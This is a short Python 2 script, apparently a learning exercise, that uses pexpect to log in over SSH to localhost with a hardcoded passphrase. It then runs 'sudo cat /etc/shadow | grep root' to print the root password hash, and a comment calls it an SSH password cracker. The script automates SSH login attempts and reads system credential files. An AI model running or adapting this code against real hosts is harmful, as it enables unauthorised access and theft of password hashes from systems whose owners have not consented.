#!/usr/bin/env python

from covenant import pre
from covenant import post
import pexpect

PROMPT = ['#', '>>>', '>', '\$', 'marcel@Linux-System', ':~']
ERROR_CONNECTING = '[-] Error Connecting'
PASSWORD_PROMPT = '[P|p]assword:'
SUDO_PROMPT = '[sudo]'
CONNECTION_FAILED = -255
GET_SHADOW_CONTENT = 'sudo cat /etc/shadow | grep root'

@pre(lambda child, cmd, password: child != None)
def send_command(child, cmd, password):
  child.sendline(cmd)
  child.expect(SUDO_PROMPT)
  child.sendline(password)
  child.expect(PROMPT)
  print child.before

@pre(lambda user, host, password: user != None and host != None and password != None)
@post(lambda result, user, host, password: result != None)
def connect(user, host, password):
  # This is just a shitty version of an ssh password cracker
  # Here we assume we have the SSH private key, but we need 
  # the passphrase key
  ssh_newkey = 'Enter passphrase for key'
  connStr = 'ssh ' + user + '@' + host
  child = pexpect.spawn(connStr)
  ret = child.expect([ pexpect.TIMEOUT, ssh_newkey, PASSWORD_PROMPT])

  if ret == 0:
    print 'Did not get passphrase dialog.'
    print ERROR_CONNECTING
    return CONNECTION_FAILED

  if ret == 1:
    child.sendline(password)
    ret = child.expect(PROMPT)
    if ret == 0:
      print 'Passphrase was rejected'
      print ERROR_CONNECTING
      return CONNECTION_FAILED
    # child.sendline(password)
    # child.expect(PROMPT)

    return child

def main():
  host = 'localhost'
  user = 'marcel'
  password = 'matr1234'
  print '---- Running ----'
  child = connect(user, host, password)
  if child == CONNECTION_FAILED:
    print 'Unable to continue execution.'
  else:
    send_command(child, GET_SHADOW_CONTENT, password)

if __name__ == '__main__':
  main()